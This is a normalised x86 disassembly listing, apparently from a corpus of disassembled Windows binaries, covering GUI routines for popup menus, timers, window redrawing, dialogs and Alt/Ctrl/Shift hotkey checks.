mov [ rw-data ] edx
mov [ rw-data ] ebp
mov [ rw-data ] edi
mov [ rw-data ] 0x0
call sub_4b6619
add esp 0x4
push 0x0
call ebx
mov edi [ lstrcmpiA@IAT ]
jmp r-xdata
mov [ esi ] ebx
lea ecx [ esi - 0x1c ]
push ecx
lea ecx [ esp + 0x2c ]
mov [ esi ] 0x10
call sub_407bb0
mov ebp [ esp + 0x30 ]
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
xor eax eax
mov al [ rw-data ]
push eax
call sub_451690
mov eax [ rw-data ]
mov ecx [ rw-data ]
add esp 0x4
lea edx [ esp + 0x60 ]
push edx
push ebp
push 0x101a
push eax
mov [ esp + 0x70 ] 0x2
mov [ esp + 0x78 ] ecx
call ebx
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea edx [ esp + 0x60 ]
push edx
push 0x1
push 0x101a
push eax
mov [ esp + 0x78 ] ecx
call ebx
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea edx [ esp + 0x60 ]
push edx
push 0x2
push 0x101a
push eax
mov [ esp + 0x78 ] ecx
call ebx
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea edx [ esp + 0x60 ]
push edx
push 0x3
push 0x101a
push eax
mov [ esp + 0x78 ] ecx
call ebx
push rw-data
lea ecx [ esp + 0x638 ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov ebp [ rw-data ]
mov edx ebp
sub edx edi
sar edx 0x2
test edx edx
jbe r-xdata
test al 0x2
jne r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_466930
mov eax [ rw-data ]
add esp 0x18
cmp eax 0x8
jl r-xdata
test al 0x2
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call sub_466930
mov eax [ rw-data ]
add esp 0x18
cmp eax 0x8
jl r-xdata
mov ecx rw-data
mov [ rw-data ] 0x1
mov [ esp + 0x1c ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0xac4 ] 0x0
je r-xdata
call [ timeGetTime@IAT ]
mov [ rw-data ] eax
dec eax
cmp ecx eax
je r-xdata
test edi edi
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test esi esi
je r-xdata
mov [ esp + 0x13 ] dl
mov [ esp + 0x13 ] al
mov eax 0x12
jmp r-xdata
mov eax 0x7
jmp r-xdata
mov eax 0x9
jmp r-xdata
lea ecx [ esp + 0x60 ]
push ecx
push rw-data
call sub_420d20
add esp 0x8
test al al
je r-xdata
or [ rw-data ] esi
push sub_4c3650
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
call sub_4b6619
add esp 0x4
mov [ esp + 0xac4 ] 0x4
cmp eax 0x4a
jne r-xdata
add esi 0x70
cmp esi ebp
jne r-xdata
mov ecx [ esp + 0xd0 ]
mov eax 0x10
cmp ecx eax
mov ecx [ esp + 0xbc ]
jae r-xdata
test [ esi ] 0x10
je r-xdata
mov esi [ esp + 0x48 ]
cmp esi eax
je r-xdata
mov eax [ esp + 0x4c ]
add esi 0x70
lea edx [ esi - 0x1c ]
cmp edx eax
jne r-xdata
mov edx [ rw-data ]
shr edx 0x3
and edx 0xffffff01
push edx
call sub_451770
add esp 0x4
xor esi esi
lea edi [ esp + 0x1e8 ]
nop
call sub_452350
jmp r-xdata
sub ecx [ ebp - 0x4 ]
add ecx eax
mov [ rw-data ] ecx
mov ecx eax
sub ecx esi
dec edx
cmp ebx edx
jge r-xdata
cmp esi [ rw-data ]
jne r-xdata
cmp esi [ rw-data ]
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0xad4 ]
mov ecx [ esp + 0x14 ]
push 0x1
push edx
push eax
push ecx
push edi
call sub_4719b0
mov edx [ rw-data ]
add esp 0x14
push edx
call [ UpdateWindow@IAT ]
mov ecx rw-data
call sub_401420
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
jle r-xdata
cmp ebp 0x2
jne r-xdata
mov ebp [ rw-data ]
test ebp ebp
je r-xdata
jmp r-xdata
push 0x0
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
push eax
lea eax [ esp + 0x48 ]
push eax
call sub_481f30
add esp 0x8
push rw-data
lea ecx [ esp + 0x48 ]
call sub_46b640
jmp r-xdata
push 0xffffffff
push edi
lea edx [ esp + 0x68 ]
push edx
mov ecx rw-data
call sub_401dd0
call [ timeGetTime@IAT ]
push eax
call sub_4b69ba
add esp 0x4
lea eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x2c ]
call sub_46b590
lea ecx [ esp + 0x44 ]
mov [ esp + 0xac4 ] 0x6
call sub_4010f0
push eax
mov ecx rw-data
call sub_42cee0
lea ecx [ esp + 0x44 ]
call sub_4010f0
test eax eax
jle r-xdata
lea ecx [ esp + 0x28 ]
call sub_403b20
lea ecx [ esp + 0x44 ]
call sub_403b20
lea ecx [ esp + 0xb8 ]
call sub_401a90
cmp [ esp + 0x78 ] 0x10
jb r-xdata
cmp esi [ esp + 0x2c ]
jne r-xdata
mov eax [ esp + 0xad0 ]
test eax eax
jge r-xdata
push 0x0
call ebx
lea ecx [ esp + 0x28 ]
call sub_403b20
cmp [ esi + 0x18 ] eax
jb r-xdata
lea ecx [ esp + 0xbc ]
add esi 0x4
mov edi 0x10
mov edi edi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx ebp
push ecx
push eax
mov eax [ edi + 0x14 ]
push eax
push 0x0
mov ecx edi
call sub_401150
test eax eax
je r-xdata
push ebp
push rw-data
call sub_42dee0
add esp 0x8
mov edx [ edi + ebx * 4 ]
sub edx [ edi + ebx * 4 + 0x4 ]
add edx ecx
add edx eax
mov [ rw-data ] edx
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
mov edx [ rw-data ]
push edx
call [ UpdateWindow@IAT ]
jmp r-xdata
cmp edi [ rw-data ]
je r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
push eax
call [ UpdateWindow@IAT ]
jmp r-xdata
cmp edi [ rw-data ]
je r-xdata
mov al [ esp + 0x18 ]
test al al
jne r-xdata
mov eax [ esp + 0xacc ]
cmp eax 0xa
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x380 ]
test eax eax
jne r-xdata
mov ebp [ rw-data ]
mov eax [ rw-data ]
lea ecx [ esp + 0x1e8 ]
call sub_401a00
lea ecx [ esp + 0x28 ]
mov [ esp + 0xac4 ] 0x4
call sub_403b20
xor ebp ebp
nop
mov eax [ esp + 0x64 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
mov eax [ esp + 0xad0 ]
sub esi 0x70
test eax eax
jge r-xdata
push 0x0
call ebx
jmp r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
inc esi
add edi 0x1c
cmp esi 0x4
jl r-xdata
push esi
call sub_423170
push esi
call sub_4231b0
add esp 0x8
mov [ esi + rw-data ] 0x0
push edi
call sub_437c70
add esp 0x4
mov edi eax
cmp eax 0xb
je r-xdata
cmp eax 0x2
jne r-xdata
add ecx edi
test ecx ecx
mov ecx [ rw-data ]
jge r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
lea ecx [ esp + 0x28 ]
call sub_4010f0
mov esi eax
call sub_4b69c7
xor edx edx
div esi
mov ecx [ esp + 0x2c ]
imul edx edx 0x70
lea esi [ edx + ecx ]
mov edx [ rw-data ]
lea ecx [ edx + ebp ]
push esi
call sub_402540
mov eax [ esp + 0x30 ]
add eax 0xffffff90
push eax
mov ecx esi
call sub_402540
lea ecx [ esp + 0x28 ]
call sub_4010f0
dec eax
push eax
lea ecx [ esp + 0x2c ]
call sub_42cee0
lea ecx [ esp + 0x44 ]
inc edi
add ebp 0x70
call sub_4010f0
cmp edi eax
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ rw-data ] 0x0
cmp esi ebp
jne r-xdata
add esi 0x70
cmp esi ebp
jne r-xdata
push ecx
push eax
call edi
test eax eax
je r-xdata
mov eax [ esp + 0x4c ]
add esi 0x70
lea ecx [ esi - 0x4 ]
cmp ecx eax
jne r-xdata
cmp eax 0x7
je r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
push eax
call sub_4024d0
call sub_401530
add esp 0x1c
cmp eax 0x6
je r-xdata
push esi
call sub_421f40
mov ecx eax
add esp 0x4
lea ebp [ ecx + 0x1 ]
mov edi edi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx edi
test edx edx
jge r-xdata
xor eax eax
test ecx ecx
je r-xdata
test ecx ecx
mov eax 0x7fffff
je r-xdata
lea edx [ esp + 0x134 ]
push edx
mov ecx rw-data
xor bl bl
call sub_4209f0
mov esi [ eax ]
mov eax [ rw-data ]
cmp esi eax
mov ecx eax
je r-xdata
cmp [ esi + 0x18 ] 0x10
mov [ esp + 0x14 ] 0xffffffff
lea edi [ esi + 0x4 ]
jb r-xdata
mov [ rw-data ] 0x1
push 0x1
push 0xffffffff
push 0x1
add esi 0x4
push 0x0
jmp r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push 0x0
jmp r-xdata
mov eax [ esp + 0xacc ]
cmp eax 0x49
jne r-xdata
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp eax ebx
je r-xdata
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
and ecx 0x7
push 0x0
push ecx
call sub_425b70
add esp 0x8
mov eax [ rw-data ]
push eax
push 0xffffffff
push 0x4a
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ esp + 0x14 ]
push 0x1
push edx
push eax
mov eax [ esp + 0xae0 ]
push eax
call sub_485220
mov ecx [ rw-data ]
add esp 0x10
push ecx
call [ UpdateWindow@IAT ]
jmp r-xdata
mov [ rw-data ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ esp + 0xacc ]
test eax eax
je r-xdata
cmp ebp [ esi + 0x8 ]
je r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
push esi
lea eax [ esi - 0x4 ]
push eax
lea ecx [ esp + 0x2c ]
call sub_407bb0
mov ebp [ esp + 0x30 ]
xor edx edx
mov dl [ rw-data ]
push edx
call sub_451690
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
cmp [ esi + 0x34 ] 0x10
jb r-xdata
mov esi [ esi ]
cmp esi ecx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
cmp esi ecx
jne r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
cmp [ rw-data ] 0x2
je r-xdata
lea edx [ esp + 0x14 ]
push edx
push eax
push 0x2
call sub_4232a0
add esp 0xc
test eax eax
mov ecx 0x7fffff
mov [ esp + 0x14 ] ecx
je r-xdata
mov cl [ rw-data ]
test cl cl
mov esi [ ShowWindow@IAT ]
je r-xdata
push 0x0
push 0x0
push 0x40a
push eax
call ebx
mov eax [ rw-data ]
lea eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
jmp r-xdata
mov bl 0x1
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp eax 0x1
je r-xdata
push 0x1
push ecx
push edi
jmp r-xdata
mov edi [ edi ]
lea ecx [ eax + 0x54 ]
lea ebp [ eax + 0x38 ]
call sub_41f020
mov ebx eax
mov ecx ebp
dec ebx
call sub_41f020
cmp eax ebx
jne r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
push 0x0
push esi
push 0x1
push 0x1
push eax
push 0x2
call sub_423c30
add esp 0x18
push sub_4480e0
push 0x20
push 0x1c
push esi
call sub_4b6814
push esi
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x138 ]
push ecx
mov ecx rw-data
call sub_4209f0
cmp esi [ eax ]
je r-xdata
cmp eax 0x3
jne r-xdata
lea eax [ esp + 0x12c ]
push eax
mov ecx rw-data
call sub_4209f0
mov esi [ eax ]
mov eax [ esp + 0xacc ]
call sub_425d10
add esp 0xc
mov ecx [ esp + 0x14 ]
mov ecx ebp
call sub_41f020
mov ecx eax
dec ecx
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x5
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
jmp r-xdata
test bl bl
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push eax
call [ DestroyWindow@IAT ]
mov [ rw-data ] 0x0
push eax
call esi
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
jmp r-xdata
mov eax [ rw-data ]
add eax edi
test eax eax
mov eax [ rw-data ]
jge r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0xa
jg r-xdata
mov eax [ esp + 0xad4 ]
push 0x0
push sub_488db0
push eax
push 0xa1
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
push 0x5
push eax
mov [ rw-data ] eax
call esi
test eax eax
je r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push 0x1
push 0x0
push ecx
push edx
call sub_485220
add esp 0x10
push sub_4480e0
push 0x4
push 0x1c
lea eax [ esp + 0x1f4 ]
push eax
mov [ esp + 0xad4 ] 0xffffffff
call sub_4b6814
jmp r-xdata
mov ecx [ rw-data ]
add eax 0x13
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] ecx
je r-xdata
xor eax eax
mov [ rw-data ] 0x0
mov eax 0x7fffff
jmp r-xdata
mov [ rw-data ] 0x1
mov eax [ rw-data ]
push sub_45ba40
push 0x7d0
push 0x3
push eax
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov edx [ rw-data ]
push eax
push edx
call [ KillTimer@IAT ]
mov edi [ rw-data ]
push 0x1
mov [ rw-data ] 0x0
mov ecx [ esi + 0x8 ]
push eax
push ecx
call sub_425f00
add esp 0xc
mov [ rw-data ] edi
jmp r-xdata
sub_48ed30
push esi
mov esi [ esp + 0xc ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
cmp esi 0x12
je r-xdata
cmp esi 0x10
je r-xdata
cmp esi 0x11
je r-xdata
push ebx
mov ebx [ GetAsyncKeyState@IAT ]
push ebp
push edi
mov edi [ esp + 0x1c ]
push 0x12
mov ebp esi
and edi 0xffff
call ebx
test ah ah
jns r-xdata
push 0x11
call ebx
test ah ah
jns r-xdata
or esi 0x400
mov ebp esi
push 0x10
call ebx
test ah ah
jns r-xdata
or ebp 0x200
mov ebx [ esp + 0x14 ]
xor eax eax
xor esi esi
or ebp 0x100
inc esi
cmp esi 0xab
jb r-xdata
push ebx
push edi
push esi
call sub_48a5f0
add esp 0xc
mov eax 0x1
cmp [ esi * 4 + rw-data ] ebp
jne r-xdata
pop edi
pop ebp
pop ebx
pop esi
retn
sub_48edc0
sub esp 0x4c
push ebp
push esi
push edi
call [ CreatePopupMenu@IAT ]
mov ebp eax
xor eax eax
mov ecx 0xc
lea edi [ esp + 0x28 ]
[ edi ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
test ecx ecx
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x12
jle r-xdata
mov al [ esp + 0x5c ]
test al al
je r-xdata
mov edi [ InsertMenuItemA@IAT ]
push ebx
mov ebx [ lstrlenA@IAT ]
mov esi 0x1
mov [ esp + 0x10 ] rw-data
lea ebx [ ebx ]
mov edx [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x20 ]
sub eax ecx
cdq
sub eax edx
mov esi eax
mov eax [ esp + 0x24 ]
sar esi 0x1
add esi ecx
mov ecx [ esp + 0x1c ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
add eax ecx
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] eax
mov ecx 0x14
mov eax [ rw-data ]
test eax eax
je r-xdata
test eax eax
jl r-xdata
lea eax [ esp + 0x2c ]
mov [ esp + 0x3c ] esi
mov [ esp + 0x34 ] 0x800
push eax
jmp r-xdata
mov eax [ rw-data ]
test eax eax
pop edi
pop esi
pop ebp
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi * 4 + rw-data ]
push eax
push 0x1
push ecx
call sub_48a5f0
add esp 0xc
mov al [ rw-data ]
test al al
jne r-xdata
mov edx [ rw-data ]
push eax
push edx
call [ KillTimer@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
add edx 0x4
mov [ esp + 0x10 ] edx
mov edx [ rw-data ]
inc esi
add edx eax
lea ecx [ esi - 0x1 ]
cmp ecx edx
jl r-xdata
mov eax [ eax * 4 + rw-data ]
push eax
mov [ esp + 0x40 ] esi
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x54 ] eax
call ebx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x54 ] eax
push ecx
push 0x0
push esi
push ebp
call edi
add esp 0x4c
retn
mov edx [ rw-data ]
push sub_45cdc0
push 0xc8
push 0x2
push edx
call [ SetTimer@IAT ]
mov [ rw-data ] eax
lea eax [ esp + 0x10 ]
push eax
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
call [ GetCursorPos@IAT ]
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
xor ecx ecx
jmp r-xdata
push 0x1
call [ ShowCursor@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ edx ]
cmp eax 0xfffffffe
jne r-xdata
pop ebx
mov edx [ rw-data ]
push 0x0
push edx
push 0x0
push eax
push esi
or ecx 0x100
push ecx
push ebp
call [ TrackPopupMenu@IAT ]
push ebp
mov esi eax
call [ DestroyMenu@IAT ]
test esi esi
je r-xdata
sub_48efa0
sub esp 0x84
push ebx
push ebp
push esi
mov esi [ esp + 0x94 ]
test esi esi
push edi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x84
retn
cmp esi 0x7
jg r-xdata
mov edi [ esp + 0x9c ]
test edi edi
jle r-xdata
cmp edi 0x8
jg r-xdata
mov ebp [ GetWindowLongA@IAT ]
lea eax [ edi + esi * 8 ]
mov ebx [ eax * 4 + rw-data ]
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x24 ] ebx
je r-xdata
cmp esi 0x2
jne r-xdata
cmp esi 0x1
jne r-xdata
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
push 0xffffffeb
push eax
call ebp
cmp edi 0x1
jne r-xdata
cmp esi 0x2
jne r-xdata
cmp edi esi
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
cmp ebx 0xac
jge r-xdata
mov eax [ rw-data ]
cmp [ eax ] edi
jne r-xdata
cmp esi 0x3
je r-xdata
cmp edi 0x1
jne r-xdata
mov ecx [ rw-data ]
push ecx
push esi
push 0x23
call sub_48a5f0
add esp 0xc
mov eax 0x24
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
cmp ebx 0x205
jge r-xdata
mov ecx [ esp + 0xa4 ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x127
push 0xfffffffa
push ecx
call ebp
push eax
call [ LoadMenuA@IAT ]
mov esi eax
push 0x0
push esi
call [ GetSubMenu@IAT ]
lea edx [ esp + 0x18 ]
push edx
mov ebx eax
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
test eax eax
mov edi [ rw-data ]
je r-xdata
cmp edi 0x1
jne r-xdata
cmp esi 0x4
jne r-xdata
mov edx [ rw-data ]
push edx
push edi
push 0x24
call sub_48a5f0
add esp 0xc
mov eax 0x25
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
cmp ebx 0x306
jge r-xdata
mov ebx [ esp + 0xa4 ]
test ebx ebx
je r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
cmp ebx 0x14
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push eax
mov eax [ rw-data ]
push eax
call [ KillTimer@IAT ]
cmp esi 0x3
jne r-xdata
mov eax [ esp + 0xa4 ]
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push eax
call [ GetCursorPos@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
call [ ScreenToClient@IAT ]
cmp ebx 0x1
mov edi [ rw-data ]
mov esi [ rw-data ]
jne r-xdata
test eax eax
jne r-xdata
cmp ebx 0x15
je r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push 0x0
push ecx
push 0x0
push edx
push eax
push 0x100
push ebx
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
call [ TrackPopupMenu@IAT ]
push esi
mov ebx eax
call [ DestroyMenu@IAT ]
push 0xffffffeb
push edi
mov [ rw-data ] edi
call ebp
mov esi eax
lea ecx [ esi + 0x20 ]
push ecx
mov ecx rw-data
call sub_40b320
lea edx [ esi + 0x24 ]
push edx
mov ecx rw-data
call sub_40b320
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x8 ]
mov [ rw-data ] ecx
mov edx [ esi + 0x14 ]
mov [ rw-data ] edx
mov eax [ esi + 0xc ]
mov [ rw-data ] eax
mov ecx [ esi + 0x10 ]
mov [ rw-data ] ecx
mov dl [ esi + 0x18 ]
mov [ rw-data ] dl
mov eax [ esi + 0x128 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x1c ]
mov [ rw-data ] ecx
mov [ rw-data ] edi
mov edx [ esi + 0x130 ]
mov [ rw-data ] edx
mov eax [ esi + 0x134 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x138 ]
mov [ rw-data ] ecx
mov edx [ esi + 0x13c ]
mov [ rw-data ] edx
mov eax [ esi + 0x140 ]
mov [ rw-data ] eax
mov cl [ esi + 0x144 ]
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] cl
mov edx [ esi + 0x148 ]
mov [ rw-data ] edx
jne r-xdata
push 0x1
call [ ShowCursor@IAT ]
cmp esi 0x4
jne r-xdata
mov ebx 0x11
mov [ esp + 0x24 ] ebx
jmp r-xdata
sub ebx 0x2ff
lea eax [ ebx - 0x1 ]
cmp eax 0x5
ja r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov dl [ rw-data ]
test dl dl
mov eax esi
mov ecx edi
mov [ rw-data ] eax
mov [ rw-data ] ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ebx 0x10
jl r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov ebx 0x13
mov [ esp + 0x24 ] ebx
jmp r-xdata
jmp [ eax * 4 + jump_table_49035c ]
cmp ebx 0x1
jne r-xdata
cmp edx 0x1
je r-xdata
mov edx [ esp + 0x24 ]
sub edx 0x200
mov [ esp + 0x24 ] edx
je r-xdata
mov dl [ rw-data ]
test dl dl
jne r-xdata
lea ecx [ esp + 0x18 ]
push ecx
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x18 ]
push edx
push eax
call [ ScreenToClient@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x48 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ rw-data ]
push eax
push ecx
mov ecx esp
mov [ esp + 0x44 ] esp
push rw-data
call sub_40a740
push ecx
mov ecx esp
mov [ esp + 0x48 ] esp
push rw-data
call sub_40a740
push 0x1
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x54 ]
push eax
lea ecx [ esp + 0x80 ]
push ecx
call sub_45ddb0
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x70 ]
mov ebp [ esp + 0x34 ]
sub eax ecx
sub eax ebp
mov ebp [ esp + 0x44 ]
cdq
sub eax edx
mov edx [ esp + 0x6c ]
mov ecx eax
mov eax [ esp + 0x74 ]
sub eax edx
sub eax ebp
cdq
sub eax edx
sar ecx 0x1
add esp 0x20
sar eax 0x1
test ecx ecx
jge r-xdata
cmp ebx 0x80
je r-xdata
cmp ebx 0x13
jg r-xdata
push eax
lea eax [ esi + 0x108 ]
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax rw-data
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push ecx
mov ecx esp
mov [ esp + 0x40 ] esp
push rw-data
call sub_40a740
push ecx
mov ecx esp
mov [ esp + 0x44 ] esp
push rw-data
call sub_40a740
call sub_45fb70
fstp [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call sub_466930
mov edx [ rw-data ]
push edx
call sub_466150
mov eax [ rw-data ]
add esp 0x24
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx [ rw-data ]
push ecx
call [ UpdateWindow@IAT ]
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
push ecx
mov ecx esp
mov [ esp + 0x40 ] esp
push rw-data
call sub_40a740
push ecx
mov ecx esp
mov [ esp + 0x44 ] esp
push rw-data
call sub_40a740
call sub_45e630
fstp [ rw-data ]
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
call sub_466930
mov eax [ rw-data ]
push eax
call sub_466150
add esp 0x24
jmp r-xdata
push ecx
mov ecx esp
mov [ esp + 0x40 ] esp
push rw-data
call sub_40a740
push ecx
mov ecx esp
mov [ esp + 0x44 ] esp
push rw-data
call sub_40a740
push 0x0
call sub_45e820
fstp [ rw-data ]
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_466930
mov ecx [ rw-data ]
push ecx
call sub_466150
mov edx [ rw-data ]
add esp 0x28
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
push eax
call [ UpdateWindow@IAT ]
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
push ecx
mov ecx esp
mov [ esp + 0x40 ] esp
push rw-data
call sub_40a740
push ecx
mov ecx esp
mov [ esp + 0x44 ] esp
push rw-data
call sub_40a740
push 0x1
call sub_45e820
fstp [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call sub_466930
mov edx [ rw-data ]
push edx
call sub_466150
mov eax [ rw-data ]
add esp 0x28
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx [ rw-data ]
push ecx
call [ UpdateWindow@IAT ]
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
push 0x1
call sub_48edc0
add esp 0x4
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
fld [ rw-data ]
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpo r-xdata
cmp ebx 0x3
je r-xdata
mov eax [ rw-data ]
push 0x149
push 0xfffffffa
push eax
call ebp
push eax
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
jmp r-xdata
cmp edx 0x2
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
test eax eax
jge r-xdata
xor ecx ecx
cmp esi 0x3
je r-xdata
cmp ebx 0x82
jne r-xdata
cmp esi 0x3
je r-xdata
mov [ rw-data ] 0x0
mov ecx [ esi + 0x124 ]
mov [ rw-data ] ecx
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
mov edx [ rw-data ]
push edx
call [ UpdateWindow@IAT ]
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
mov [ rw-data ] edx
mov edx [ rw-data ]
push 0x0
push edx
mov [ rw-data ] eax
mov [ rw-data ] ecx
call sub_466930
mov eax [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ esp + 0x24 ]
test edx edx
jne r-xdata
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov ebx [ esp + 0x24 ]
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
cmp edx 0x3
jne r-xdata
cmp ebx 0x1
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
push 0x0
push 0x1
push 0x0
push eax
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x28 ]
push edx
mov edx [ esp + 0x30 ]
push ecx
push edx
push eax
call sub_477a80
mov edi [ rw-data ]
